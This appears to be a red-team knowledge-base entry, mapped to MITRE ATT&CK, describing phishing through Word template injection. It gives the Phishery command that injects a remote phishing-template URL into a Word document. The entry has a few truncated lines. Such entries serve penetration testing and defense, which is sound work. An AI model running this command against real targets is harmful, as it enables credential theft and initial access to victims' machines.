---
id: 5764924c-7ae4-4faf-804a-67faab58d051
name: Phishing Word Document Injection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:23.930357+00:00'
updated_at: '2023-04-10T20:36:51.165107+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Phishing|T1566 - Phishing]]'
- '[[Template Injection|T1221 - Template Injection]]'
tags:
- '[[DOCX - Template Injection]]'
- '[[Office - Attacks]]'
- '[[Template Injections Tools]]'
commands:
- '[[Phishery - Injecting URL into Word Document]]'
---

# Phishing Word Document Injection

## Summary

Phishing Word Document Injection is a technique used by attackers to deliver malicious payloads to victims through a crafted Word document. Attackers can use various techniques to lure victims into opening the document, such as social engineering tactics or spear-phishing emails. Once the victim op

## Description

# Description

Phishing Word Document Injection is a technique used by attackers to deliver malicious payloads to victims through a crafted Word document. Attackers can use various techniques to lure victims into opening the document, such as social engineering tactics or spear-phishing emails. Once the victim opens the document, the attacker can execute malicious code through the template injection vulnerability. This technique can be used by attackers to gain initial access to a victim's machine and further compromise the target network.

Technical Explanation: This technique exploits the vulnerability in the way Word documents process templates. Attackers can modify the template content to include malicious code that will execute when the document is opened. This technique can be used to bypass security measures such as antivirus software and firewalls.

Business Value: This technique can be used by attackers to gain access to sensitive information, steal intellectual property, or disrupt business operations. It can result in financial loss, reputational damage, and legal consequences.

 

## Requirements

1. A crafted Word document with a template injection vulnerability

1. A delivery method such as social engineering tactics or spear-phishing emails

 

## Defense

1. Ensure that all employees are aware of the risks associated with opening unsolicited emails or downloading attachments from unknown sources

1. Implement security measures such as antivirus software and firewalls to detect and prevent template injection attacks

1. Regularly update and patch software to mitigate vulnerabilities

 

## Objectives

1. Deliver a malicious payload to a victim's machine through a crafted Word document

1. Gain initial access to a victim's machine

1. Compromise the target network

 

# Instructions

1. The Phishery tool is used to inject a Word document with a phishing template. The -u flag specifies the URL of the phishing template, the -i flag specifies the name of the original Word document, and the -o flag specifies the name of the new, injected Word document. Upon running the command, the original document is opened, the phishing template is set, and the injected document is saved.

 



**Code**: [[$ phishery -u https://secure.site.local/docs -i go]]



> -u: The URL of the phishing template.
-i: The name of the original Word document.
-o: The name of the new, injected Word document.



**Command** ([[Phishery - Injecting URL into Word Document]]):

```bash
$ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Phishing|T1566 - Phishing]]
- [[Template Injection|T1221 - Template Injection]]

## Commands Used

- [[Phishery - Injecting URL into Word Document]]

## Tags

- [[DOCX - Template Injection]]
- [[Office - Attacks]]
- [[Template Injections Tools]]


